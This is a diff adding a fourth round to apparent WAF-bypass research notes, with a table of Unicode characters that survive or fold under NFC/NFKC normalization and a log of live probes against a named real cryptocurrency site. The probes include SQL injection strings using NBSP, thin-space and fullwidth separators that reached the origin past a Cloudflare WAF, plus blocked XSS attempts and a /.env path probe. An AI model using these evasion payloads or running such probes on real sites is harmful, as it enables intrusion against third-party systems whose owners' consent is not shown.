@@ -183,3 +183,38 @@ ASCII space. However this app uses Doctrine parameterized queries + Symfony's st
 request handling, so the delivered payload is treated as inert string data; overlong
 sequences are rejected/escaped rather than folded. No reconstruction-to-execution path was
 found. The WAF gap is real; the exploit gap is closed by the origin stack.
+
+## Round 4 — UTF-8 normalization lib study (glibc/ICU/NFC/NFKC) + NFKC-reconstructing chunks
+
+Environment: glibc 2.36, ICU 72, Unicode 15.0. Scripts: utf8_norm_study.py, utf8_norm_matrix.py, waf_nfkc_chunk.py, nfkc_round4_results.txt
+
+### What the normalization layers are oblivious to (local ground truth)
+| char | UTF-8 bytes | NFC/NFD | NFKC/NFKD | verdict for chunk building |
+|---|---|---|---|---|
+| NBSP U+00A0 | c2a0 (2B) | IDENTITY | → ' ' | **the chunk byte**: CF-safe, NFKC reconstructs space |
+| THIN SP U+2009 | e28089 (3B) | IDENTITY | → ' ' | same, +1 byte |
+| IDEOGRAPHIC U+3000 | e38080 (3B) | IDENTITY | → ' ' | same |
+| ZWSP U+200B | e2808b | IDENTITY | IDENTITY | invisible, never folds — pure WAF noise |
+| SOFT-HYPHEN U+00AD | c2ad | IDENTITY | IDENTITY | never folds (HTML strips it, unicode doesn't) |
+| OGHAM SP U+1680 | e19a80 | IDENTITY | IDENTITY | NOT folded by NFKC (surprise) |
+| fullwidth letters FF21-FF5A | 3B each | IDENTITY | → ASCII | reconstructs whole keywords (ALTER/UNION) |
+| Cyrillic homoglyphs аеорсх | 2B each | IDENTITY | IDENTITY | look identical, no layer ever folds them |
+
+Key insight: NFC/NFD (what glibc mbrtowc/iconv/PHP mbstring/Symfony default normalize with) is IDENTITY on every exotic char above. Only NFKC/NFKD (compatibility folding) reconstitutes spaces/fullwidth. So a "chunk" that survives CF edge AND reconstructs at origin must be consumed by an NFKC-aware downstream (ICU collator, some WAF-inspect-on-normalized variants, HTML parsers).
+
+### Live probes against bitcoinvn.io (Round 4)
+| probe | construction | result |
+|---|---|---|
+| sqli-nbsp-sep | `' UNION␠NBSP SELECT␠NBSP 1,2-- -` | ✅ HTTP 200 REACHED ORIGIN |
+| sqli-thin-sep | same with U+2009 | ✅ 200 origin |
+| sqli-fullwidth-kw | ＡＬＥＲＴ ␠ ＵＮＩＯＮ select | ✅ 200 origin |
+| sqli-fw-space | union␠U+3000select | ✅ 200 origin |
+| dotfile-fw-dot | /%EF%BC%AEenv (NFKC→/.env) | reached origin, 404 (no fold server-side) |
+| xss-svg-nbsp | <svg␠NBSP onload=... | ❌ CF-WAF-BLOCK 403 |
+| xss-svg-thin | <svg␠THIN onload=... | ❌ CF-WAF-BLOCK 403 |
+| xss-onerror-thin | <img src=x␠NBSP onerror=... | ❌ CF-WAF-BLOCK 403 |
+
+### Findings
+1. SQL rules bypassed by NFKC-reconstructing separators (NBSP = only 2 bytes per substitution — compactest agnostic chunk found; %00-style single-byte controls still cheaper but don't reconstruct anywhere).
+2. XSS attribute-separator rules do NOT share the SQL separator dictionary — CF normalizes unicode spaces inside SQL contexts but not HTML tag contexts. Encoding asymmetry between rule families confirmed again.
+3. Origin does no NFKC before routing/file lookup (fw-dot path resolved as different filename → 404), so reconstruction-to-execution remains theoretical on this stack; Doctrine handles the SQLi chunk as opaque string data.
